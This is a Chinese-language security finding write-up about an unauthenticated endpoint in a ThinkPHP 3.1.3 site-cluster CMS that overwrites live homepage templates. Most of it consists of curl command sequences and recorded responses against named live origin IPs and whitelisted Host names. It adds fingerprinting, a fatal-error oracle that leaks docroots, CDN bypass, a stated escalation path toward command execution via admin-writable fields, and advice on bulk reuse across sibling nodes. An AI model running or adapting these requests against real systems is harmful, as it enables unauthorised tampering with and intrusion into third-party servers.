# ThinkPHP3.1.3 站群 CMS：Home/Order::get_html1 零凭证覆盖线上模板文件

## 0. 结论
该站群 Home 组的 `OrderAction` **不继承 CommonAction**（所以 Home 组鉴权与 REQUEST_URI 层 WAF 一起被跳过），其 `get_html1()` 零凭据可调：
每次调用会 `file_get_contents` 本站 `List/index` 的渲染结果，再 `file_put_contents` 覆盖
`App/Tpl/Home/Index_index.html` 与 `App/Tpl/Home/Index_indexapp.html`。

性质是 **非预期任意模板文件写入（模板烘焙原语）**，不等于 command execution validation —— 见 §4。

## 1. 前置条件 / 指纹
- 目标是这套 SomCNS / ThinkPHP 3.1.3 站群：
  - `GET /index.php?g=Home&m=List&a=index&type=0` 返回带 `about="<数字>"` 的列表页；
  - `GET /App/Tpl/Admin/Public_left.html` 零凭据可直读（nginx 把 Tpl 当静态文件直出）。
- PHP 进程对 `App/Tpl/Home/` 有写权限（该站群默认部署即满足）。
- 入口建议用 `/index.php?g=...&m=...&a=...`，伪静态路径亦可；vhost 部署必须带正确 Host/SNI。
- 若域名走边缘/CDN 而不承载应用，需 `--resolve` 固定 SNI 直连源站 IP（本条主站源站 45.151.135.176）。

## 2. 请求（无 Cookie、无凭据）
```bash
T=https://TARGET          # 换成目标主域名

# 0) 基线：读取写入探针（该动作自己写 time()）
curl -k -s --noproxy '*' "$T/Upload/atop/attime3_5.txt"

# 1) 触发（关键一步，零凭据）
curl -k -s -i --noproxy '*' "$T/index.php?g=Home&m=Order&a=get_html1"
#    → HTTP/1.1 200，body: {"ok":1}
#      部分版本回 {"ok":1,"msg":"成功请刷新"}

# 2) 复读探针
curl -k -s --noproxy '*' "$T/Upload/atop/attime3_5.txt"

# 边缘不承载时：直连源站（固定 SNI，只改 Host/请求行）
H='usertobbs.<品牌>.<随机>.top'          # 必须过应用层 HTTP_HOST 白名单
curl -k -s -i --noproxy '*' --resolve "$H:443:45.151.135.176" "https://$H/index.php?g=Home&m=Order&a=get_html1"
```

## 3. 判据（满足其中两条即可判定成立）
1. 步骤 1 返回 **200 且 body 为 `{"ok":1...}`**（对照：不存在的 action 会给 nginx 404）。
2. **`/Upload/atop/attime3_5.txt` 数值逐次跳变** —— 该文件内容就是 `time()`，变化即证明服务端真的重跑了烘焙逻辑。
3. **模板文件被覆盖，且覆盖内容 = 本站自己的渲染结果**：
```bash
curl -k -s --noproxy '*' "$T/App/Tpl/Home/Index_index.html"        | md5sum
curl -k -s --noproxy '*' "$T/index.php?g=Home&m=List&a=index&type=0" | md5sum
curl -k -s --noproxy '*' "$T/App/Tpl/Home/Index_indexapp.html"      | md5sum
curl -k -s --noproxy '*' "$T/index.php?g=Home&m=List&a=index&type=1" | md5sum
# 两组 md5 各自相等 ⇒ 写入内容确为本站 List 页渲染结果，不是别站/缓存
```
若 Tpl 不能被静态直读，用 `-o /dev/null -w '%{size_download}\n'` 比对调用前后的字节数变化。
替代判据（更轻、无需 md5）：`HEAD` 模板文件比对 **Last-Modified / ETag** 调用前后是否跳变（见 §8）。
强判据（本条 §11 实测）：模板 **字节数 + md5 同时变化**。

## 4. 为什么没闭合到命令执行
- 烘焙源是**本站自身的 List/index**，抓取 URL 硬编码指向本站域名 ⇒ **内容源不可由外部控制**。
- 要打穿必须是「List 页会渲染的字段里出现可控字符串」：`article.title`、`cat.description`、`cat.you` 等
  （模板里带 `|htmlspecialchars_decode` 输出，库里转义的 `&lt;php&gt;` 会被还原成 `<php>`）。
- 这些字段只能从 **admin 后台**（需会话）或**同源 DB** 写入；该目标的会员线（前台会员账号）没有对应可写字段，
  因此缺最后一个「凭据写库入口」，本条只能停在「匿名可覆盖模板文件」。
- 一旦拿到后台会话，正确顺序是：写 `article.title` / `cat.description` →
  再跑一次 `get_html1` 烘焙 → 用触发分支的 Host 访问首页 → 模板编译执行。
- 反过来：若目标上已存在任意写 `.php` 的点，直接走那条，不必绕模板链。

## 5. 触发渲染时的 Host 分支（覆盖了不等于被渲染）
```php
// Home/IndexAction::index()
if (strpos($domain,'sp') !== false) { display('indexapp'); }        // → Index_indexapp.html
elseif (strpos($domain, '<防封关键字>') !== false) { display('indexalert'); } // → 防封壳页，不渲染被污染模板
else { display(); }                                                // → Index_index.html ★ 用这种 Host
```
所以：覆盖后要么用不含 `sp`、不含防封关键字的域名访问首页，要么走 `Index_indexapp.html` 分支的同名域名，
否则看到的是小体积防封页，会误判「没写进去」。

## 6. 常见失败原因
| 现象 | 原因 |
|---|---|
| 404 / nginx 错误页 | 控制器/动作不在该安装上（精简版可能没有 Order 的这个方法），或入口路径不对 |
| 200 但探针时间戳不变 | `App/Tpl/Home/` 不可写；或 `file_get_contents` 抓取失败（`strlen($content) > 100` 才写，抓取失败时是 `false`） |
| 模板字节数变了、前台首页没变 | 用了含 `sp` 或防封关键字的 Host，`display()` 走进了别的分支 |
| 首页变成小体积壳页 | 同上，命中了 `indexalert` 防封分支，不是写入失败 |
| 想确认「真写入」但模板不能直读 | 只能靠 `/Upload/atop/attime3_5.txt`（time()）+ `jquery3_5.txt` 字节数双重 oracle，或 HEAD 看 Last-Modified/ETag |
| 直连 IP 报 403 | 没带能过应用层 HTTP_HOST 白名单的 Host，命中了 IP 默认 vhost 的拒绝规则 |
| 边缘节点报 404/无此应用 | 该域名的边缘层不承载应用；用 `--resolve` 直连源站 IP 再试 |

## 7. 注意
- `Home/Order/all_lock` 同样是零凭据（同一个 `extends Action`），但它会
  `M("article")->setField(lock=1)` **改业务数据**，只做只读验证时不要触发。
- 并发保持 1、间隔 ≥1.5s；本机若有系统代理必须加 `--noproxy '*'`，否则回显会被代理污染。

## 8. 第二次独立验证（含鉴权依据 oracle，推荐先跑这一步再发包）
2026-11-08 10:44–10:47 GMT，对同一目标另起一条执行线，`curl -k --noproxy '*'` 直连（本机系统代理不可用），**全程无 Cookie**：

```bash
# ① 基线：记录模板文件元数据
curl -k -s -I --noproxy '*' "https://TARGET/App/Tpl/Home/Index_index.html"
# HTTP/1.1 200 OK
# Content-Length: 290203
# Last-Modified: Sun, 08 Nov 2026 10:44:56 GMT
# ETag: "6af052a8-46d9b"

# ② 零凭证触发（关键）
curl -k -s --noproxy '*' "https://TARGET/index.php?g=Home&m=Order&a=get_html1"
# HTTP/1.1 200 OK
# {"ok":1,"msg":"成功请刷新"}

# ③ 复读：Last-Modified 与 ETag 同时跳变 ⇒ docroot 内模板被非预期写入
curl -k -s -I --noproxy '*' "https://TARGET/App/Tpl/Home/Index_index.html"
# HTTP/1.1 200 OK
# Content-Length: 290203          ← 字节数不变：写进去的就是同源 /List/index 渲染结果（同为 290203B）
# Last-Modified: Sun, 08 Nov 2026 10:47:08 GMT
# ETag: "6af0532c-46d9b"
```

**鉴权依据（继承链预言机，同时回显 docroot 绝对路径）**：

```bash
curl -k -s --noproxy '*' "https://TARGET/App/Lib/Action/Home/OrderAction.class.php/"
# Fatal error: Class 'Action' not found in /www/wwwroot/<docroot>/App/Lib/Action/Home/OrderAction.class.php on line 2
# ⇒ OrderAction extends Action，不是 CommonAction ⇒ 整段跳过 CommonAction 的鉴权

# 对照组（走闸门的控制器）
curl -k -s --noproxy '*' "https://TARGET/App/Lib/Action/Home/IndexAction.class.php/"
# Fatal error: Class 'CommonAction' not found in ...
```

影响边界复核：同控制器其余 22 个候选方法均 404，**未发现第二条写原语**；写入内容仍为站点自身 `/List/index` 渲染输出，非任意内容 —— 直接危害是非预期篡改首页模板。

## 9. 同族第二节点复现（14.128.54.93 / docroot /www/wwwroot/sqbb.com，2026-11-08）
证明该原语是**站群级**的，不是单站偶发；同 IP 上的不同 docroot 各自独立。

- 节点指向：`admin.sqbbfor.fotapper.abrdns.com` → `14.128.54.93`，docroot 由 PATH_INFO 的 fatal error 证实为
  `/www/wwwroot/sqbb.com`（与另一实例的 `/www/wwwroot/thisthbweb_com` 互不可写）。
- 直连 IP 必须带能过应用层 HTTP_HOST 白名单的 Host，例如 `usertobbs.thb.mysqbbthisgoodsfor33333user.top`；
  不带 Host 直接访问该路径返回 **403**（IP 默认 vhost 拒绝），别误判为漏洞不存在。
- 前置：目标 443 可直接访问；无需任何账号或 Cookie。

```bash
IP=14.128.54.93
H='usertobbs.thb.mysqbbthisgoodsfor33333user.top'

# ① 鉴权依据 + docroot 回显（必须带白名单 Host）
curl -k -s --noproxy '*' -H "Host: $H" "https://$IP/App/Lib/Action/Home/OrderAction.class.php/"
# Fatal error: Class 'Action' not found in /www/wwwroot/sqbb.com/App/Lib/Action/Home/OrderAction.class.php on line 3
# ⇒ extends Action，脱队，跳过 CommonAction 鉴权

# ② 基线元数据
curl -k -s -I --noproxy '*' -H "Host: $H" "https://$IP/App/Tpl/Home/Index_index.html"
# 200, Content-Length: 433780, ETag: "6af0....-69e74", Last-Modified: ... 11:46:xx GMT

# ③ 零凭证触发
curl -k -s --noproxy '*' -H "Host: $H" "https://$IP/index.php?g=Home&m=Order&a=get_html1"
# 200, 47B, {"ok":1,"msg":"成功请刷新"}

# ④ 复读：Last-Modified 推进到调用时刻、ETag 变化
curl -k -s -I --noproxy '*' -H "Host: $H" "https://$IP/App/Tpl/Home/Index_index.html"
# 200, Content-Length: 433780, Last-Modified: 11:53:37 GMT, ETag: "6af062c1-69e74"
# body md5 = EE2C43B2660697139028F90CF1A6C310

# ⑤ 内容来源对照：与本站 List 页逐字节相同
curl -k -s --noproxy '*' -H "Host: admin.sqbbfor.fotapper.abrdns.com" "https://$IP/List/index/type/0"
# 200, Content-Length: 433780, md5 = EE2C43B2660697139028F90CF1A6C310 ⇒ 写入内容确为本站渲染结果

curl -k -s --noproxy '*' -H "Host: $H" "https://$IP/Upload/atop/attime3_5.txt"
# 1794138819（= 本次调用时刻的 time()）
```

- **边界（本条到此为止，未升级）**：落点固定为 `App/Tpl/Home/Index_index.html`、抓取源固定为本站
  `/List/index/type/0` ⇒ **写入路径与内容均不可控**，只构成非预期模板覆写，不构成命令执行；
  也不能跨 docroot 写 `/www/wwwroot/thisthbweb_com`。要闭合仍需另配能写 `article.title` / `cat.description`
  的凭据入口（见 §4、kb#377 的抓取源否证）。
- **横向价值**：拿到站群任一节点后，可把同一组请求按「源站 IP + 白名单 Host」批量套到同族其它 IP/域名，
  用 `OrderAction.class.php/` 的 fatal error 一次性确认「是否同套代码 + docroot 绝对路径」。

## 10. 第四次独立验证（task#648 / finding 1317，2026-11-09 14:28–14:31 GMT）
同主站 `https://<目标>/`（docroot `/www/wwwroot/thisthbweb_com`），`curl -k -s --noproxy '*'`，**全程零 Cookie**。
目的是确认该原语在一天后仍可匿名触发，并留下「写入内容 = 本站 `List/index?type=1`」的新证据：

```bash
# ① 版本指纹（排除 TP5/3.2 分支）
curl -k -s --noproxy '*' "https://TARGET/Help/"
# 200/1331B，页脚 ThinkPHP 3.1.3 { Fast & Simple OOP PHP Framework }

# ② 继承链 oracle + docroot
curl -k -s --noproxy '*' "https://TARGET/App/Lib/Action/Home/OrderAction.class.php/"
# Fatal error: Class 'Action' not found in /www/wwwroot/thisthbweb_com/App/Lib/Action/Home/OrderAction.class.php on line 3
curl -k -s --noproxy '*' "https://TARGET/App/Lib/Action/Home/IndexAction.class.php/"
# Fatal error: Class 'CommonAction' not found  ⇒ 对照组，鉴权闸门确实存在于其它控制器

# ③ 基线
curl -k -s --noproxy '*' "https://TARGET/Upload/atop/attime3_5.txt"
# 1794234589
curl -k -s -I --noproxy '*' "https://TARGET/App/Tpl/Home/Index_index.html"
# 200, Content-Length: 296440, Last-Modified: Mon, 09 Nov 2026 14:30:06 GMT, ETag: "6af1d8ee-485f8"

# ④ 零凭证触发
curl -k -s -i --noproxy '*' "https://TARGET/index.php?g=Home&m=Order&a=get_html1"
# 200, 47B, {"ok":1,"msg":"成功请刷新"}

# ⑤ 复读
curl -k -s --noproxy '*' "https://TARGET/Upload/atop/attime3_5.txt"
# 1794234607（= 调用时刻，NOW_EPOCH 1794234615）
curl -k -s -I --noproxy '*' "https://TARGET/App/Tpl/Home/Index_index.html"
# 200, Content-Length: 296440, Last-Modified: Mon, 09 Nov 2026 14:30:38 GMT, ETag: "6af1d90e-485f8"

# ⑥ 内容来源对照（本次 type=1 分支）
curl -k -s --noproxy '*' "https://TARGET/index.php?g=Home&m=List&a=index&type=1"
# 200/296429B, md5 = ADB2C636A843C5AF5DAA786E2F13B5D9
curl -k -s --noproxy '*' "https://TARGET/App/Tpl/Home/Index_indexapp.html"
# 200/296429B, 同 md5 ⇒ 写入内容确为本站自身渲染结果
```

- 结论与 §4 一致：**落点固定、抓取源固定、内容不可外部控制**，只是非预期模板覆写，
  不能升级为可远程调用/驻留的脚本文件；要取脚本，需另找写 `.php` 的点，或先拿 admin 表哈希写
  `article.title` 再烘焙（kb#383）。
- 稳定性：同一 URL 在 11-08 与 11-09 两次独立执行线均成功，可视为该安装的稳定非预期原语。
- 注意：`/Help/` 请求用来指纹时体积小、无副作用；不要为了「证明能写」而连打多次，页面渲染会真实刷新线上模板。

## 11. 第五次独立验证（task#648 / finding 1320，2026-11-09 +08 夜）—— 直连源站 + 字节数/md5 双变化
本次用的是**边缘节点不承载、必须直连源站**的路径，并给出了比 §8/§9/§10 更强的判据（模板大小也变了）。

- 前置：`--resolve` 固定 SNI 直连源站 **45.151.135.176**；Host 用能过应用层白名单的分站域名；
  零 Cookie、零账号。边缘节点上同一路径不承载应用。

```bash
H='usertobbs.<品牌>.<随机>.top'
IP=45.151.135.176

# ① 基线：模板字节数与 md5
curl -k -s --noproxy '*' --resolve "$H:443:$IP" "https://$H/App/Tpl/Home/Index_index.html" | tee /tmp/t0 | wc -c
# 296618
md5sum /tmp/t0
# 140b5e4a51b13ff6082796aeba6ec788
curl -k -s --noproxy '*' --resolve "$H:443:$IP" "https://$H/Upload/atop/attime3_5.txt"
# 1794235155

# ② 零凭证触发
curl -k -s -i --noproxy '*' --resolve "$H:443:$IP" "https://$H/index.php?g=Home&m=Order&a=get_html1"
# HTTP/1.1 200 OK
# {"ok":1,"msg":"成功请刷新"}

# ③ 复读：大小与 md5 双变化 ⇒ 写入成立
curl -k -s --noproxy '*' --resolve "$H:443:$IP" "https://$H/App/Tpl/Home/Index_index.html" | tee /tmp/t1 | wc -c
# 296626        ← 比基线 +8B
md5sum /tmp/t1
# 4368a4115e92005de89ce4ea6bc619ec

# ④ 烘焙时间戳同步刷新
curl -k -s --noproxy '*' --resolve "$H:443:$IP" "https://$H/Upload/atop/attime3_5.txt"
# 1794235216    （调用前 1794235155）
```

- **判据取舍**：§8/§9/§10 里 Content-Length 常与上次相同（新写入内容恰好等于上次渲染结果），
  此时只能靠 ETag/Last-Modified 或 attime3_5.txt；本次字节数也变了，故「md5+大小双变化」可作强判据但**不是必要条件**。
  唯一稳定必达的判据仍是 `attime3_5.txt` 的 time() 跳变。
- 同控制器 `all_lock` 亦返回 `{"ok":1,"msg":"成功请刷新"}`（同一 `extends Action`），但会
  `M("article")->setField(lock=1)` 改业务数据，只读验证时不要调用。
- **边界不变**：抓取源固定为站内 `/List/index` 渲染结果，覆盖内容不可由验证者控制 ⇒ 仍只是
  「非预期覆盖前台模板文件」，是「模板注入 → 命令执行」链的写入原语，缺口是「内容可控」。
  不能据此宣称已拿到脚本驻留入口。